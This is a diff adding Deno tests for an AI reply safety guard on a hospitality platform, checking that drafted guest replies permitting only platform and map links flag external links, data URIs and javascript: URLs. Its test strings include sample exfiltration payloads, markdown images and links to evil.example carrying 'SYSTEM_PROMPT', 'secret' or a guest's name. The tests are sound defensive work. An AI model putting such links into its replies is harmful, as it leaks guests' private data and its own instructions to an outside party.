@@ -4,6 +4,7 @@ import {
   AI_SUGGEST_FALLBACK_REPLY,
   assertSafeGuestReply,
   classifyGuestInquiryIntent,
+  findUnsafeReplyLink,
 } from './inboxAiSafetyGuard.ts';
 
 Deno.test('classifyGuestInquiryIntent - sensitive guest list request', () => {
@@ -189,4 +190,41 @@ Deno.test('a refusal with no figure stays safe', () => {
     allowedFacts: { pricingValues: [] },
   });
   assertEquals(result.safe, true);
+});
+
+Deno.test('findUnsafeReplyLink allows the platform and map links', () => {
+  assertEquals(findUnsafeReplyLink('See https://kamespace.com/stay/abc for your guide.'), null);
+  assertEquals(findUnsafeReplyLink('Directions: https://maps.app.goo.gl/xyz'), null);
+  assertEquals(findUnsafeReplyLink('Use www.kamespace.com/help'), null);
+});
+
+Deno.test('findUnsafeReplyLink blocks an external link and a data URI', () => {
+  assertEquals(
+    findUnsafeReplyLink('![status](https://evil.example/collect?d=secret)'),
+    'https://evil.example/collect?d=secret'
+  );
+  assertEquals(
+    findUnsafeReplyLink('Click [here](https://evil.example/x) now'),
+    'https://evil.example/x'
+  );
+  assertEquals(
+    findUnsafeReplyLink('![x](data:text/html;base64,PHNjcmlwdD4=)'),
+    'script or data URI'
+  );
+  assertEquals(findUnsafeReplyLink('javascript:alert(1)'), 'script or data URI');
+});
+
+Deno.test('assertSafeGuestReply blocks exfiltration through a rendered link', () => {
+  for (const draftText of [
+    '![status](https://evil.example/c?d=SYSTEM_PROMPT)',
+    'Full details: https://evil.example/?guest=Carla%20Mendoza',
+    '![x](data:text/html;base64,PHNjcmlwdD4=)',
+  ]) {
+    const result = assertSafeGuestReply({
+      draftText,
+      guestMessage: 'What is the wifi?',
+      allowedFacts: { pricingValues: [] },
+    });
+    assertEquals(result.safe, false, draftText);
+  }
 });
